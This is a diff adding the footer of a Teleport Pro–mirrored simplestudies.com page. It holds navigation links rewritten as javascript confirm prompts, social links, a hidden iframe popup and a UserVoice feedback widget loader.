+        						<li><a href="javascript:if(confirm('http://simplestudies.com/about-us.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/about-us.html'" tppabs="http://simplestudies.com/about-us.html"
+                           >About&nbsp;Us</a></li>    
+
+        						<li><a href="javascript:if(confirm('http://simplestudies.com/contact.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/contact.html'" tppabs="http://simplestudies.com/contact.html"
+               rel="nofollow"            >Contact&nbsp;Us</a></li>    
+
+        						<li><a href="javascript:if(confirm('http://simplestudies.com/privacy-policy.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/privacy-policy.html'" tppabs="http://simplestudies.com/privacy-policy.html"
+               rel="nofollow"            >Privacy&nbsp;Policy</a></li>    
+
+        						<li><a href="javascript:if(confirm('http://simplestudies.com/disclaimer.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/disclaimer.html'" tppabs="http://simplestudies.com/disclaimer.html"
+               rel="nofollow"            >Disclaimer</a></li>    
+
+        						<li><a href="javascript:if(confirm('http://simplestudies.com/site-map.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/site-map.html'" tppabs="http://simplestudies.com/site-map.html"
+                           >Site&nbsp;Map</a></li>    
+
+        						<li><a href="javascript:if(confirm('http://simplestudies.com/accounting-links.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/accounting-links.html'" tppabs="http://simplestudies.com/accounting-links.html"
+               rel="nofollow"            >Links</a></li>    
+
+        						<li><a href="javascript:if(confirm('http://simplestudies.com/copyright.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/copyright.html'" tppabs="http://simplestudies.com/copyright.html"
+               rel="nofollow"            >Copyright</a></li>    
+
+        						<li><a href="javascript:if(confirm('http://simplestudies.com/terms-of-service.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/terms-of-service.html'" tppabs="http://simplestudies.com/terms-of-service.html"
+               rel="nofollow"            >Terms&nbsp;of&nbsp;Service</a></li>    
+
+         					
+					</ul>
+				</div>				<div class="rss"><a href="javascript:if(confirm('http://feeds.feedburner.com/Simplestudies  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://feeds.feedburner.com/Simplestudies'" tppabs="http://feeds.feedburner.com/Simplestudies">RSS</a></div>
+								<div class="twitter"><a target="_blank" href="javascript:if(confirm('http://twitter.com/simplestudies  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://twitter.com/simplestudies'" tppabs="http://twitter.com/simplestudies">Twitter</a></div>
+				<div class="facebook"><a target="_blank" href="javascript:if(confirm('http://www.facebook.com/pages/simplestudies/363136279253  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.facebook.com/pages/simplestudies/363136279253'" tppabs="http://www.facebook.com/pages/simplestudies/363136279253">Facebook</a></div>
+								<div class="clear"></div>
+				<div class="copy">Copyright &copy; Simplestudies LLC 2004-2011. All rights reserved</div>
+			</div>
+		</div>
+
+	</div>
+	
+	<div id="TB_overlay" style="display:none;"></div>
+	<div id="TB_popup" class="drop"  style="display:none;">		  
+		<div class="close"><a href="#" onclick="document.getElementById('TB_overlay').style.display='none';document.getElementById('TB_popup').style.display='none'; document.getElementById('TB_iframe').src=''; return false;"><img src="close.gif" tppabs="http://simplestudies.com/images/close.gif" width="51" height="48" alt="" /></a></div>
+		<div class="clear"></div>
+		<div class="drop_in_2">
+		
+		<iframe id="TB_iframe" name="TB_iframe" src="blank.html" tppabs="http://simplestudies.com/blank.html" frameborder="no" height="400px" width="801px" align="left">
+    		Browser does not support frames!
+ 		</iframe>		
+		
+		</div> 
+		<div class="drop_top"></div>
+		<div class="drop_bot"></div>
+	</div>	
+	
+		
+<script type="text/javascript">
+var uservoiceOptions = {
+  /* required */
+  key: 'simplestudies',
+  host: 'http://simplestudies.com/simplestudies.uservoice.com', 
+  forum: '102873',
+  showTab: true,  
+  /* optional */
+  alignment: 'right',
+  background_color:'#f00', 
+  text_color: 'white',
+  hover_color: '#06C',
+  lang: 'en'
+};
+
+function _loadUserVoice() {
+  var s = document.createElement('script');
+  s.setAttribute('type', 'text/javascript');
+  s.setAttribute('src', ("https:" == document.location.protocol ? "https://" : "http://") + "cdn.uservoice.com/javascripts/widgets/tab.js");
+  document.getElementsByTagName('head')[0].appendChild(s);
+}
+_loadSuper = window.onload;
+window.onload = (typeof window.onload != 'function') ? _loadUserVoice : function() { _loadSuper(); _loadUserVoice(); };
+</script>
+
+</body>
+</html>
